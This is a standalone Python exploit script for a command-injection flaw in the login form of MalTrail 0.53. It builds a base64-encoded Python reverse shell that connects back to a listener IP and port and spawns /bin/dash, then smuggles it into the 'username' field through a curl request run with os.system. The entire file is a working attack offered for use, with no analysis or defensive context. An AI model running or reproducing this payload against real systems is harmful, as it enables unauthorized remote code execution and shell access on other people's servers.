import sys
import os
import base64
import argparse

def main():
    args = parse_arguments()

    target_URL = args.target_url + "/login"
    print(f"Running exploit on {target_URL}")
    send_payload(args.listening_ip, args.listening_port, target_URL)

def send_payload(my_ip, my_port, target_url):
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/dash")\''
    encoded_payload = base64.b64encode(payload.encode()).decode()
    command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    os.system(command)

def parse_arguments():
    parser = argparse.ArgumentParser(description="This exploit creates a Reverse-Shell from a python RCE on MalTrail 0.53")
    parser.add_argument("listening_ip", help="The IP address for the exploit listener.")
    parser.add_argument("listening_port", type=int, help="The port number for the exploit listener.")
    parser.add_argument("target_url", help="The base URL of the vulnerable target. (excluding /login)")

    args = parser.parse_args()

    if not args.listening_ip or not args.listening_port or not args.target_url:
        parser.error("All arguments are required.")
    
    return args

if __name__ == "__main__":
    main()
